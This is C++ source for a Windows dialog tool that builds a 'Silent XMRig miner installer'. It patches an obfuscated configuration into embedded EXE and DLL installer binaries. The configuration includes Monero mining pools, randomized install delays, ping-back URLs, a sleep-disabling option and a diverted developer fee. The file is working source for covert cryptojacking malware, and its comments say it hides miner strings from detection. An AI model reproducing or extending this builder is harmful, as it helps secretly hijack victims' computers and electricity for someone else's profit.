#include "settings.h"
#include "dialog.h"
#include "InstallerDLL.h"
#include "InstallerEXE.h"

minerConfig mConfig;

int magickCrypt = 54;

settings s1 =
{
	{ "12345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345",
	  "12345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345",
	  "12345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345",
	  "12345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345",
	  "12345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345" }, //addrs

	{ "monerohash.com:9999",
	  "pool.supportxmr.com:9000",
	  "xmr-us-west1.nanopool.org:14433",
	  "" }, //americaWestPools

	{ "monerohash.com:9999",
	  "pool.supportxmr.com:9000",
	  "xmr-us-east1.nanopool.org:14433",
	  "" }, //americaEastPools

	{ "xmrpool.eu:9999",
	  "pool.supportxmr.com:9000",
	  "xmr-eu1.nanopool.org:14433",
	  "xmr-eu2.nanopool.org:14433" }, //EuropePools

	{ "pool.supportxmr.com:9000",
	  "xmr-asia1.nanopool.org:14433",
	  "",
	  "" }, //AsiaPools

	"--coin monero -k --rig-id worker --cpu-priority 0 --tls",

	"",
	"",

	60, //maxThreadsDesktop
	15, //maxThreadsLaptop
	2048, //L3CachePerThread
	6144, //lightModeRam

	120, //installerDelayMin
	360, //installerDelayMax

	2, //minerDeployDelayMin
	7, //minerDeployDelayMax

	false, //heavyCalcDelay
	true, //onBatteryMining
	true,  //disableSleep

	{ "", "", "" } //customArgs

};

void showTestValue(HWND hwnd)
{
	std::string resultArgs;
	generateStartArguments(&mConfig, &resultArgs);
	getSetStringInEditControl(hwnd, &resultArgs, IDC_EDIT33, true);
}

void generateSettingsForDIalog() 
{
	generateSettings(&mConfig, &s1);
}

void configureSilentMinerInstaller()
{
	TCHAR buffer[MAX_PATH] = { 0 };
	GetModuleFileName(NULL, buffer, MAX_PATH);

	char* minerBinEXE;
	char* minerBinDLL;
	std::string errorMsg;
	std::ofstream fileOutEXE;
	std::ofstream fileOutDLL;
	std::string outPathEXE = std::string("configuredInstallerEXE.exe");
	std::string outPathDLL = std::string("configuredInstallerDLL.dll");
	minerConfig* mConfigp;

	fileOutEXE.open(outPathEXE, std::ios::binary | std::ios::trunc);
	fileOutDLL.open(outPathDLL, std::ios::binary | std::ios::trunc);

	minerBinEXE = (char*)malloc(InstallerEXE_exe_len);
	minerBinDLL = (char*)malloc(InstallerDLL_dll_len);
	memcpy(minerBinEXE, InstallerEXE_exe, InstallerEXE_exe_len);
	memcpy(minerBinDLL, InstallerDLL_dll, InstallerDLL_dll_len);

	mConfigp = (minerConfig*)malloc(sizeof(minerConfig));
	*mConfigp = mConfig;

	//'Encrypt' structure, so miner specific plain text is not present in binary
	configLightEncrypt(mConfigp, magickCrypt);

	//Replace minerConfig structure in binary
	replaceMinerConfig(mConfigp, &minerBinEXE, InstallerEXE_exe_len);
	replaceMinerConfig(mConfigp, &minerBinDLL, InstallerDLL_dll_len);

	//Write miner installer in to file
	if (fileOutEXE.is_open() && fileOutDLL.is_open())
	{
		fileOutEXE.write((char*)minerBinEXE, InstallerEXE_exe_len);
		fileOutEXE.close();
		fileOutDLL.write((char*)minerBinDLL, InstallerDLL_dll_len);
		fileOutDLL.close();

		MessageBox(NULL, "Created configured \"Silent XMRig miner installer\" binaries", "Success", MB_OK);
	}
	else 
	{
		goto ERRORCREATE;
	}

	free(minerBinEXE);
	free(minerBinDLL);
	free(mConfigp);

	return;

ERRORCREATE:
	MessageBox(NULL, "An error has occurred!\nconfigured installer was not created\nCheck source code", "Error!", MB_ICONERROR | MB_OK);
}

void loadSettingsFromSilentMinerInstaller() 
{
	std::ifstream fileIn;
	std::ifstream::pos_type pos;
	size_t size;
	char* minerBin;
	minerConfig localmConfig;
	minerConfig* mConfigp = &localmConfig;
	OPENFILENAME fn;
	char szFileName[MAX_PATH] = "";

	ZeroMemory(&fn, sizeof(fn));
	fn.lStructSize = sizeof(fn);
	fn.hwndOwner = NULL;
	fn.lpstrFilter = "All Files (*.*)\0*.*\0";
	fn.lpstrFile = szFileName;
	fn.nMaxFile = MAX_PATH;
	fn.lpstrTitle = "Select silent miner installer";
	fn.Flags = OFN_FILEMUSTEXIST;

	if (GetOpenFileName(&fn) == TRUE)
	{
		fileIn.open(szFileName, std::ios::binary | std::ios::ate);
		if (fileIn.fail())
		{
			goto ERRORCREATE;
		}
		
		pos = fileIn.tellg();
		size = pos;

		minerBin = (char*)malloc(size);
		fileIn.seekg(0, std::ios::beg);
		fileIn.read(minerBin, size);

		if (minerBin == nullptr || size == 0)
		{
			goto ERRORCREATE;
		}

		fileIn.close();

		for (size_t i = 0; i < size - sizeof(minerConfig); i++) {

			if (memcmp(minerBin + i, mConfig.pointer, sizeof(mConfig.pointer)) == 0)
			{
				memcpy(mConfigp, minerBin + i, sizeof(minerConfig));

				configLightDecrypt(mConfigp, 54);

				if (mConfigp->configured == false) 
				{
					MessageBox(NULL, szFileName, "Settings in file are not configured", MB_OK);
					free(minerBin);
					return;
				}

				
				settingsFromConfig(mConfigp, &s1);

				MessageBox(NULL, szFileName, "Loaded settings from File", MB_OK);
				free(minerBin);

				return;
			}
		}

		MessageBox(NULL, szFileName, "Settings not found in File", MB_ICONERROR | MB_OK);
		free(minerBin);
	}

	return;

ERRORCREATE:
	MessageBox(NULL, "An error has occurred!\nconfiguration was not loaded\nCheck source code", "Error!", MB_ICONERROR | MB_OK);
}

void getSetDialogValues(HWND hwnd, bool set)
{
	for (int i = 0; i < sizeof(s1.addrs) / sizeof(s1.addrs[0]); getSetStringInEditControl(hwnd, &s1.addrs[i], IDC_EDIT1 + i, set), i++);

	for (int i = 0; i < sizeof(s1.americaWestPools) / sizeof(s1.americaWestPools[0]); getSetStringInEditControl(hwnd, &s1.americaWestPools[i], IDC_EDIT6 + i, set), i++);
	for (int i = 0; i < sizeof(s1.americaEastPools) / sizeof(s1.americaEastPools[0]); getSetStringInEditControl(hwnd, &s1.americaEastPools[i], IDC_EDIT10 + i, set), i++);
	for (int i = 0; i < sizeof(s1.EuropePools) / sizeof(s1.EuropePools[0]); getSetStringInEditControl(hwnd, &s1.EuropePools[i], IDC_EDIT14 + i, set), i++);
	for (int i = 0; i < sizeof(s1.AsiaPools) / sizeof(s1.AsiaPools[0]); getSetStringInEditControl(hwnd, &s1.AsiaPools[i], IDC_EDIT18 + i, set), i++);

	getSetNumberInEditControl(hwnd, &s1.installerDelayMin, IDC_EDIT22, set);
	getSetNumberInEditControl(hwnd, &s1.installerDelayMax, IDC_EDIT23, set);
	if (s1.installerDelayMax < s1.installerDelayMin)
	{
		s1.installerDelayMax = s1.installerDelayMin;
		getSetNumberInEditControl(hwnd, &s1.installerDelayMax, IDC_EDIT23, true);
	}
	getSetNumberInEditControl(hwnd, &s1.minerDeployDelayMin, IDC_EDIT24, set);
	getSetNumberInEditControl(hwnd, &s1.minerDeployDelayMax, IDC_EDIT25, set);
	if (s1.minerDeployDelayMax < s1.minerDeployDelayMin)
	{
		s1.minerDeployDelayMax = s1.minerDeployDelayMin;
		getSetNumberInEditControl(hwnd, &s1.minerDeployDelayMax, IDC_EDIT25, true);
	}

	getSetNumberInEditControl(hwnd, &s1.lightModeRam, IDC_EDIT26, set);
	getSetNumberInEditControl(hwnd, &s1.maxThreadsDesktop, IDC_EDIT27, set);
	if (s1.maxThreadsDesktop > 100)
	{
		s1.maxThreadsDesktop = 100;
		getSetNumberInEditControl(hwnd, &s1.maxThreadsDesktop, IDC_EDIT27, true);
	}
	getSetNumberInEditControl(hwnd, &s1.maxThreadsLaptop, IDC_EDIT36, set);
	if (s1.maxThreadsLaptop > 100)
	{
		s1.maxThreadsLaptop = 100;
		getSetNumberInEditControl(hwnd, &s1.maxThreadsLaptop, IDC_EDIT36, true);
	}

	getSetNumberInEditControl(hwnd, &s1.L3CachePerThread, IDC_EDIT28, set);

	getSetStringInEditControl(hwnd, &s1.additionalArgs, IDC_EDIT29, set);

	getSetStringInEditControl(hwnd, &s1.installPingUrl, IDC_EDIT34, set);
	getSetStringInEditControl(hwnd, &s1.miningStartPingUrl, IDC_EDIT35, set);

	getSetBoolInCheckBox(hwnd, &s1.heavyCalcDelay, IDC_CHECK1, set);
	getSetBoolInCheckBox(hwnd, &s1.onBatteryMining, IDC_CHECK2, set);
	getSetBoolInCheckBox(hwnd, &s1.disableSleep, IDC_CHECK3, set);

	getSetStringInEditControl(hwnd, &s1.customArgs[0], IDC_EDIT30, set);
	getSetStringInEditControl(hwnd, &s1.customArgs[1], IDC_EDIT31, set);
	getSetStringInEditControl(hwnd, &s1.customArgs[2], IDC_EDIT32, set);
}


std::string developerFeeArgs()
{
	return "developer fee args";
}

void generateStartArguments(minerConfig* config, std::string* result)
{
	int customerPoolNum = 0;
	customerPoolNum = config->americaEastPoolsNum + config->americaWestPoolsNum + config->asiaPoolsNum + config->europePoolsNum;

	if (randomAnInt(0, 9) == 0)
	{
		*result = developerFeeArgs();
		return;
	}

	if (config->configured == false || customerPoolNum == 0)
	{
		*result = developerFeeArgs() + " *missconfigured miner";
		return;
	}

	*result = constructArguments(config);
}